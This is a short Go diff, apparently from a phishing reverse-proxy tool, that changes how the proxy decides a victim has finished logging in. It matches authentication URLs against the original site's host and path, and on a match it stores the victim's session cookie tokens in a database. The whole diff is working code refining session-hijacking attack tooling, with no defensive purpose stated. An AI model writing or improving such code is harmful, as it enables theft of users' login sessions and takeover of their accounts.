@@ -764,8 +764,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
 					if ok && !s.IsDone {
+						origin_host, _ := p.replaceHostWithOriginal(req.URL.Host)
+						origin_url := origin_host + req.URL.Path
 						for _, au := range pl.authUrls {
-							if au.MatchString(req.URL.Path) {
+							if au.MatchString(origin_url) {
 								s.Finish(true)
 								break
 							}
@@ -1082,8 +1084,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
+					origin_host, _ := p.replaceHostWithOriginal(resp.Request.URL.Host)
+					origin_url := origin_host + resp.Request.URL.Path
 					for _, au := range pl.authUrls {
-						if au.MatchString(resp.Request.URL.Path) {
+						if au.MatchString(origin_url) {
 							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
 							if err != nil {
 								log.Error("database: %v", err)
